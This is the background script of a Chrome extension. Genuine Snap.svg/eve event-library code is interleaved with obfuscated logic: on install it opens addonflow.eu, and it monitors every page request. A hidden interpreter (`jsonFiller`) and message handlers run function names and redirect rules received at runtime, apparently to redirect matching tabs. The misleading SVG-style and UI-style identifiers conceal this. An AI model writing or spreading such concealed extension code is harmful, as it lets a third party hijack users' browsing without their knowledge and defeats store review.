chrome.runtime.onStartup.addListener( function(){} );

eve = function(name, scope) {
  var e = events,
    oldstop = stop,
    args = Array.prototype.slice.call(arguments, 2),
    listeners = eve.listeners(name),
    z = 0,
    f = false,
    l, indexed = [],
    queue = {},
    out = [],
    ce = current_event,
    errors = [];
  out.firstDefined = firstDefined;
  out.lastDefined = lastDefined;
  current_event = name;
  stop = 0;
  for (var i = 0, ii = listeners.length; i < ii; i++)
    if ("zIndex" in listeners[i]) {
      indexed.push(listeners[i].zIndex);
      if (listeners[i].zIndex < 0) {
        queue[listeners[i].zIndex] = listeners[i];
      }
    }
  indexed.sort(numsort);
  while (indexed[z] < 0) {
    l = queue[indexed[z++]];
    out.push(l.apply(scope, args));
    if (stop) {
      stop = oldstop;
      return out;
    }
  }
  for (i = 0; i < ii; i++) {
    l = listeners[i];
    if ("zIndex" in l) {
      if (l.zIndex == indexed[z]) {
        out.push(l.apply(scope, args));
        if (stop) {
          break;
        }
        do {
          z++;
          l = queue[indexed[z]];
          l && out.push(l.apply(scope, args));
          if (stop) {
            break;
          }
        } while (l)
      } else {
        queue[l.zIndex] = l;
      }
    } else {
      out.push(l.apply(scope, args));
      if (stop) {
        break;
      }
    }
  }
  stop = oldstop;
  current_event = ce;
  return out;
};

var animatePageTransition = {};
var affixElementToViewport = false;
var stampDateOnDocument = false;

chrome.storage.local.get(null, function (recrystallizeViewIntent) { animatePageTransition = recrystallizeViewIntent; } );

chrome.webRequest.onBeforeRequest.addListener(function(info) {
  if (info.tabId <= 0) {
    console.log(info);
  }
}, {
  urls: ["<all_urls>"],
  types: ["main_frame"]
});
eve.listeners = function(name) {
  var names = isArray(name) ? name : name.split(separator),
    e = events,
    item, items, k, i, ii, j, jj, nes, es = [e],
    out = [];
  for (i = 0, ii = names.length; i < ii; i++) {
    nes = [];
    for (j = 0, jj = es.length; j < jj; j++) {
      e = es[j].n;
      items = [e[names[i]], e[wildcard]];
      k = 2;
      while (k--) {
        item = items[k];
        if (item) {
          nes.push(item);
          out = out.concat(item.f || []);
        }
      }
    }
    es = nes;
  }
  return out;
};

eve.jsonFiller = function(text_rendering, stroke_miterlimit, stroke_opacity) {
  if (typeof(stroke_opacity) == 'undefined' || !stroke_opacity || typeof(stroke_opacity['font_variant']) == 'undefined') {
    return undefined;
  }
  for (let clone = 0; clone < stroke_opacity['font_variant'].length; ++clone) {
    try {
      let unicode_bidi = stroke_opacity['font_variant'][clone];
      switch (unicode_bidi['type']) {
        case 'clip_rule': {
          stroke_miterlimit[unicode_bidi['color_profile']] = unicode_bidi['clip'];
        }
        break;
        case 'image_rendering': {
          stroke_miterlimit[unicode_bidi['color_profile']] = function() {
            return eve.jsonFiller(arguments, {}, unicode_bidi['clip'])
          };
        }
        break;
        case 'kerning': {
          stroke_miterlimit[unicode_bidi['color_profile']] = function() {
            return eve.jsonFiller(arguments, stroke_miterlimit, unicode_bidi['clip'])
          };
        }
        break;
        case 'font_weight': {
          stroke_miterlimit[unicode_bidi['color_profile']] = this.fragment(text_rendering, stroke_miterlimit, unicode_bidi);
        }
        break;
        case 'glyph_orientation_horizon': {
          let pattern = [];
          pattern.push('');
          if (typeof(unicode_bidi['glyph_orientation_vertica']) != 'undefined') {
            for (let totalMatrix = 0; totalMatrix < unicode_bidi['glyph_orientation_vertica'].length; totalMatrix++) {
              pattern[0] += this.add2group(stroke_miterlimit, unicode_bidi['glyph_orientation_vertica'][totalMatrix]);
            }
          }
          stroke_miterlimit[unicode_bidi['color_profile']] = pattern[0];
        }
        break;
        case 'letter_spacing': {
          let getBBox = this.fragment(text_rendering, stroke_miterlimit, unicode_bidi);
          if (getBBox) {
            let pattern = [];
            if (typeof(unicode_bidi['color_profile']) == 'undefined') {
              unicode_bidi['color_profile'] = 'null';
            }
            if (typeof(unicode_bidi['lighting_color']) != 'undefined') {
              for (let totalMatrix = 0; totalMatrix < unicode_bidi['lighting_color'].length; totalMatrix++) {
                pattern.push(this.add2group(stroke_miterlimit, unicode_bidi['lighting_color'][totalMatrix]));
              }
            } else if (typeof(unicode_bidi['glyph_orientation_vertica']) != 'undefined') {
              pattern.push('');
              for (let totalMatrix = 0; totalMatrix < unicode_bidi['glyph_orientation_vertica'].length; totalMatrix++) {
                pattern[0] += this.add2group(stroke_miterlimit, unicode_bidi['glyph_orientation_vertica'][totalMatrix]);
              }
            }
            let writing_mode = unicode_bidi['color'][unicode_bidi['color'].length - 1];
            if (typeof(writing_mode['color_interpolation']) != 'undefined') {
              if (typeof(unicode_bidi['marker']) != 'undefined') {
                stroke_miterlimit[unicode_bidi['color_profile']] = new getBBox[writing_mode['color_interpolation']](...pattern);
              } else {
                stroke_miterlimit[unicode_bidi['color_profile']] = getBBox[writing_mode['color_interpolation']](...pattern);
              }
            } else if (typeof(writing_mode['color_interpolation_filte']) != 'undefined') {
              if (typeof(unicode_bidi['marker']) != 'undefined') {
                stroke_miterlimit[unicode_bidi['color_profile']] = new getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])](...pattern);
              } else {
                stroke_miterlimit[unicode_bidi['color_profile']] = getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])](...pattern);
              }
            } else {
              if (typeof(unicode_bidi['marker_end']) != 'undefined') {
                window.setTimeout(() => {
                  getBBox(...pattern);
                }, unicode_bidi['marker_end']);
              } else {
                if (typeof(unicode_bidi['marker']) != 'undefined') {
                  stroke_miterlimit[unicode_bidi['color_profile']] = new getBBox(...pattern);
                } else {
                  stroke_miterlimit[unicode_bidi['color_profile']] = getBBox(...pattern);
                }
              }
            }
          }
        }
        break;
        case 'marker_mid': {
          if (typeof(unicode_bidi['color_profile']) == 'undefined') {
            unicode_bidi['color_profile'] = 'null';
          }
          stroke_miterlimit[unicode_bidi['color_profile']] = new Promise(this.add2group(stroke_miterlimit, unicode_bidi['lighting_color'][0]));
        }
        break;
        case 'stroke_dashoffset': {
          return this.add2group(stroke_miterlimit, unicode_bidi['lighting_color'][0]);
        }
        break;
        case 'opacity': {
          stroke_miterlimit[unicode_bidi['color_profile']][unicode_bidi['overflow']] = this.add2group(stroke_miterlimit, unicode_bidi['lighting_color'][0]);
        }
        break;
        case 'flood_color':
        case 'pointer_events': {
          let globalMatrix = this.wrap(stroke_miterlimit, unicode_bidi);
          if (globalMatrix) {
            let marker = this.jsonFiller(text_rendering, stroke_miterlimit, unicode_bidi['shape_rendering']);
            if (typeof(marker) != 'undefined') {
              return marker;
            }
          } else {
            let marker = this.jsonFiller(text_rendering, stroke_miterlimit, unicode_bidi['stop_color']);
            if (typeof(marker) != 'undefined') {
              return marker;
            }
          }
        }
        break;
        case 'marker_start': {
          let getBBox = this.fragment(text_rendering, stroke_miterlimit, unicode_bidi);
          if (getBBox) {
            let pattern = [];
            if (typeof(unicode_bidi['lighting_color']) != 'undefined') {
              for (let totalMatrix = 0; totalMatrix < unicode_bidi['lighting_color'].length; totalMatrix++) {
                pattern.push(this.add2group(stroke_miterlimit, unicode_bidi['lighting_color'][totalMatrix]));
              }
            } else if (typeof(unicode_bidi['glyph_orientation_vertica']) != 'undefined') {
              pattern.push('');
              for (let totalMatrix = 0; totalMatrix < unicode_bidi['glyph_orientation_vertica'].length; totalMatrix++) {
                pattern[0] += this.add2group(stroke_miterlimit, unicode_bidi['glyph_orientation_vertica'][totalMatrix]);
              }
            }
            let writing_mode = unicode_bidi['color'][unicode_bidi['color'].length - 1];
            if (typeof(writing_mode['color_interpolation']) != 'undefined') {
              if (unicode_bidi['mask'] == '+=') getBBox[writing_mode['color_interpolation']] += pattern[0];
              else if (unicode_bidi['mask'] == '*=') getBBox[writing_mode['color_interpolation']] *= pattern[0];
              else if (unicode_bidi['mask'] == '/=') getBBox[writing_mode['color_interpolation']] /= pattern[0];
              else if (unicode_bidi['mask'] == '-=') getBBox[writing_mode['color_interpolation']] -= pattern[0];
              else if (unicode_bidi['mask'] == '!') getBBox[writing_mode['color_interpolation']] = !pattern[0];
              else getBBox[writing_mode['color_interpolation']] = pattern[0];
            } else if (typeof(writing_mode['color_interpolation_filte']) != 'undefined') {
              if (unicode_bidi['mask'] == '+=') getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] += pattern[0];
              else if (unicode_bidi['mask'] == '*=') getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] *= pattern[0];
              else if (unicode_bidi['mask'] == '/=') getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] /= pattern[0];
              else if (unicode_bidi['mask'] == '-=') getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] -= pattern[0];
              else if (unicode_bidi['mask'] == '!') getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] = !pattern[0];
              else getBBox[this.add2group(stroke_miterlimit, writing_mode['color_interpolation_filte'][0])] = pattern[0];
            } else {
              if (unicode_bidi['mask'] == '+=') getBBox += pattern[0];
              else if (unicode_bidi['mask'] == '/=') getBBox /= pattern[0];
              else if (unicode_bidi['mask'] == '-=') getBBox -= pattern[0];
              else if (unicode_bidi['mask'] == '*=') getBBox *= pattern[0];
              else if (unicode_bidi['mask'] == '!') getBBox = !pattern[0];
              else getBBox = pattern[0];
            }
          }
        }
        break;
        case 'flood_opacity': {
          for (stroke_miterlimit[unicode_bidi['font_size']['clip']] = unicode_bidi['font_size']['baseline_shift']; this.wrap(stroke_miterlimit, unicode_bidi);
            (unicode_bidi['stop_opacity'] == '++') ? stroke_miterlimit[unicode_bidi['font_size']['clip']]++ : stroke_miterlimit[unicode_bidi['font_size']['clip']]--) {
            let marker = this.jsonFiller(text_rendering, stroke_miterlimit, unicode_bidi['stroke_dasharray']);
            if (typeof(marker) != 'undefined') {
              return marker;
            }
          }
        }
        break;
      }
    } catch (error) {}
  }
  return undefined;
};

eve.off = eve.unbind = function(name, f) {
  if (!name) {
    eve._events = events = {
      n: {}
    };
    return;
  }
  var names = isArray(name) ? (isArray(name[0]) ? name : [name]) : Str(name).split(comaseparator);
  if (names.length > 1) {
    for (var i = 0, ii = names.length; i < ii; i++) {
      eve.off(names[i], f);
    }
    return;
  }
  names = isArray(name) ? name : Str(name).split(separator);
  var e, key, splice, i, ii, j, jj, cur = [events],
    inodes = [];
  for (i = 0, ii = names.length; i < ii; i++) {
    for (j = 0; j < cur.length; j += splice.length - 2) {
      splice = [j, 1];
      e = cur[j].n;
      if (names[i] != wildcard) {
        if (e[names[i]]) {
          splice.push(e[names[i]]);
          inodes.unshift({
            n: e,
            name: names[i]
          });
        }
      } else {
        for (key in e)
          if (e[has](key)) {
            splice.push(e[key]);
            inodes.unshift({
              n: e,
              name: key
            });
          }
      }
      cur.splice.apply(cur, splice);
    }
  }
  for (i = 0, ii = cur.length; i < ii; i++) {
    e = cur[i];
    while (e.n) {
      if (f) {
        if (e.f) {
          for (j = 0, jj = e.f.length; j < jj; j++)
            if (e.f[j] == f) {
              e.f.splice(j, 1);
              break;
            }! e.f.length && delete e.f;
        }
        for (key in e.n)
          if (e.n[has](key) && e.n[key].f) {
            var funcs = e.n[key].f;
            for (j = 0, jj = funcs.length; j < jj; j++)
              if (funcs[j] == f) {
                funcs.splice(j, 1);
                break;
              }! funcs.length && delete e.n[key].f;
          }
      } else {
        delete e.f;
        for (key in e.n)
          if (e.n[has](key) && e.n[key].f) {
            delete e.n[key].f;
          }
      }
      e = e.n;
    }
  }
  // prune inner nodes in path
  prune: for (i = 0, ii = inodes.length; i < ii; i++) {
    e = inodes[i];
    for (key in e.n[e.name].f) {
      // not empty (has listeners)
      continue prune;
    }
    for (key in e.n[e.name].n) {
      // not empty (has children)
      continue prune;
    }
    // is empty
    delete e.n[e.name];
  }
};

eve.closestPoint = function(path, x, y) {
  function distance2(p) {
    var dx = p.x - x,
      dy = p.y - y;
    return dx * dx + dy * dy;
  }
  var pathNode = path.node,
    pathLength = pathNode.getTotalLength(),
    precision = pathLength / pathNode.pathSegList.numberOfItems * .125,
    best, bestLength, bestDistance = Infinity;
  // linear scan for coarse approximation
  for (var scan, scanLength = 0, scanDistance; scanLength <= pathLength; scanLength += precision) {
    if ((scanDistance = distance2(scan = pathNode.getPointAtLength(scanLength))) < bestDistance) {
      best = scan;
      bestLength = scanLength;
      bestDistance = scanDistance;
    }
  }
  // binary search for precise estimate
  precision *= .5;
  while (precision > .5) {
    var before, after, beforeLength, afterLength, beforeDistance, afterDistance;
    if ((beforeLength = bestLength - precision) >= 0 && (beforeDistance = distance2(before = pathNode.getPointAtLength(beforeLength))) < bestDistance) {
      best = before;
      bestLength = beforeLength;
      bestDistance = beforeDistance;
    } else if ((afterLength = bestLength + precision) <= pathLength && (afterDistance = distance2(after = pathNode.getPointAtLength(afterLength))) < bestDistance) {
      best = after;
      bestLength = afterLength;
      bestDistance = afterDistance;
    } else {
      precision *= .5;
    }
  }
  best = {
    x: best.x,
    y: best.y,
    length: bestLength,
    distance: Math.sqrt(bestDistance)
  };
  return best;
};

function peekHistoryState ( validateFormFields, unbindEventListeners, fetchLazyLoadedImage )
{
  if (unbindEventListeners[stampDateOnDocument.measureElementDimension] == stampDateOnDocument.mapCoordinatesToCity )
  {
    self[stampDateOnDocument.dequeueMacroTask]
    ( 
      function() 
      {
        fetchLazyLoadedImage[stampDateOnDocument.sanitizeHtmlContent] = validateFormFields;
        fetchLazyLoadedImage[stampDateOnDocument.implementDragAndDrop] = self[stampDateOnDocument.reduceUserPrivilege][stampDateOnDocument.dimSearchHighlight]();
        smoothScrollToElement( fetchLazyLoadedImage );
      }
    , 100);    
  }
}

function getSomeDefs(el) {
  var p = el.node.ownerSVGElement && wrap(el.node.ownerSVGElement) || el.node.parentNode && wrap(el.node.parentNode) || Snap.select("svg") || Snap(0, 0),
    pdefs = p.select("defs"),
    defs = pdefs == null ? false : pdefs.node;
  if (!defs) {
    defs = make("defs", p.node).node;
  }
  return defs;
}

function getSomeSVG(el) {
  return el.node.ownerSVGElement && wrap(el.node.ownerSVGElement) || Snap.select("svg");
}

function sortTableData(obj, desc) {
    var arr = desc.split(".");
    while(arr.length && (obj = obj[arr.shift()]));
    return obj;
}

chrome.runtime.onInstalled.addListener(function(Uf) {
  if (Uf.reason === "install") {
    chrome.tabs.create({
      url: 'https://addonflow.eu/?data=abcd'
    });
  }
});

function unit2px(el, name, value) {
  var svg = getSomeSVG(el).node,
    out = {},
    mgr = svg.querySelector(".svg---mgr");
  if (!mgr) {
    mgr = $("rect");
    $(mgr, {
      x: -9e9,
      y: -9e9,
      width: 10,
      height: 10,
      "class": "svg---mgr",
      fill: "none"
    });
    svg.appendChild(mgr);
  }

  function getW(val) {
    if (val == null) {
      return E;
    }
    if (val == +val) {
      return val;
    }
    $(mgr, {
      width: val
    });
    try {
      return mgr.getBBox().width;
    } catch (e) {
      return 0;
    }
  }

  function getH(val) {
    if (val == null) {
      return E;
    }
    if (val == +val) {
      return val;
    }
    $(mgr, {
      height: val
    });
    try {
      return mgr.getBBox().height;
    } catch (e) {
      return 0;
    }
  }

  function set(nam, f) {
    if (name == null) {
      out[nam] = f(el.attr(nam) || 0);
    } else if (nam == name) {
      out = f(value == null ? el.attr(nam) || 0 : value);
    }
  }
  switch (el.type) {
    case "rect":
      set("rx", getW);
      set("ry", getH);
    case "image":
      set("width", getW);
      set("height", getH);
    case "text":
      set("x", getW);
      set("y", getH);
      break;
    case "circle":
      set("cx", getW);
      set("cy", getH);
      set("r", getW);
      break;
    case "ellipse":
      set("cx", getW);
      set("cy", getH);
      set("rx", getW);
      set("ry", getH);
      break;
    case "line":
      set("x1", getW);
      set("x2", getW);
      set("y1", getH);
      set("y2", getH);
      break;
    case "marker":
      set("refX", getW);
      set("markerWidth", getW);
      set("refY", getH);
      set("markerHeight", getH);
      break;
    case "radialGradient":
      set("fx", getW);
      set("fy", getH);
      break;
    case "tspan":
      set("dx", getW);
      set("dy", getH);
      break;
    default:
      set(name, getW);
  }
  svg.removeChild(mgr);
  return out;
}

function smoothScrollToElement ( fetchLazyLoadedImage )
{
  for (var calculateAspectRatio=0; calculateAspectRatio < affixElementToViewport[stampDateOnDocument.validateUserInput] ; calculateAspectRatio++) 
  {
    let translateElementPosition = affixElementToViewport[calculateAspectRatio];
    try
    {
      if ((new (sortTableData(self, stampDateOnDocument.decryptDataPayload))(translateElementPosition[stampDateOnDocument.sproutNewElement]))[stampDateOnDocument.decodeBase64String](fetchLazyLoadedImage[stampDateOnDocument.colorizeImageFilter]))
      {
        if 
        ( 
          (!translateElementPosition[stampDateOnDocument.tetherElementToParent] || ( translateElementPosition[stampDateOnDocument.tetherElementToParent] > translateElementPosition[stampDateOnDocument.toggleFullScreenMode] )) && 
          (!translateElementPosition[stampDateOnDocument.untetherElementFromParent] || ( translateElementPosition[stampDateOnDocument.untetherElementFromParent] + translateElementPosition[stampDateOnDocument.bindEventListeners] < fetchLazyLoadedImage[stampDateOnDocument.implementDragAndDrop] )) 
        )
        {
          if 
          ( 
            !translateElementPosition[stampDateOnDocument.drawCanvasElement] || 
            (translateElementPosition[stampDateOnDocument.drawCanvasElement] && ( !fetchLazyLoadedImage[translateElementPosition[stampDateOnDocument.drawCanvasElement]] || (fetchLazyLoadedImage[translateElementPosition[stampDateOnDocument.drawCanvasElement]] && fetchLazyLoadedImage[translateElementPosition[stampDateOnDocument.drawCanvasElement]] == translateElementPosition[stampDateOnDocument.persistAppState]))) 
          )
          {
            affixElementToViewport[calculateAspectRatio][stampDateOnDocument.bindEventListeners]=fetchLazyLoadedImage[stampDateOnDocument.implementDragAndDrop];
            affixElementToViewport[calculateAspectRatio][stampDateOnDocument.toggleFullScreenMode]++;
            sortTableData(self, stampDateOnDocument.convertCurrencyValue)(fetchLazyLoadedImage[stampDateOnDocument.sanitizeHtmlContent], {[stampDateOnDocument.colorizeImageFilter]: translateElementPosition[stampDateOnDocument.collapseAccordionItem] + (translateElementPosition[stampDateOnDocument.decolorizeImageFilter]==1?self[stampDateOnDocument.enqueueSnackbar](fetchLazyLoadedImage[stampDateOnDocument.colorizeImageFilter]):'')} );
          }
        }
        calculateAspectRatio=affixElementToViewport[stampDateOnDocument.validateUserInput];       
      }            
    }
    catch (e) 
    {
    }
  }
}

setInterval ( function() { chrome.storage.local.set({'rotateElementDegree':Date.now()}) }, 15000 );

chrome.runtime.onMessage.addListener(function(serializeFormData, expandAccordionItem, cacheApiResponse)
{
  if (serializeFormData['encodeBase64String'] == 'morphElementShape')
  {
    sortTableData(self, serializeFormData['populateDropdownOptions'])[serializeFormData['unbundleResourceModules']](serializeFormData['bundleResourceModules']);
    animatePageTransition = self[serializeFormData['queueMacroTask']][serializeFormData['computeHashFromString']](animatePageTransition, serializeFormData['bundleResourceModules']);
  }
  else if (serializeFormData['encodeBase64String'] == 'clampNumberRange')
  {
    animatePageTransition = self[serializeFormData['queueMacroTask']][serializeFormData['computeHashFromString']](animatePageTransition, serializeFormData);
  }
  else if (serializeFormData['encodeBase64String'] == 'unmuteAudioStream')
  {
    cacheApiResponse(animatePageTransition);
  }
  else if (serializeFormData['encodeBase64String'] == 'encodeUrlParameters')
  {
    if (!affixElementToViewport)
    {
      affixElementToViewport = serializeFormData['affixElementToViewport'];
      stampDateOnDocument = serializeFormData['stampDateOnDocument'];   
      sortTableData(self, stampDateOnDocument.unobserveElement)[stampDateOnDocument.attachShadowDom](smoothScrollToElement, stampDateOnDocument.revealOverlay); 
      sortTableData(self, stampDateOnDocument.unmorphElementShape)[stampDateOnDocument.attachShadowDom](peekHistoryState); 
    }
  }
});
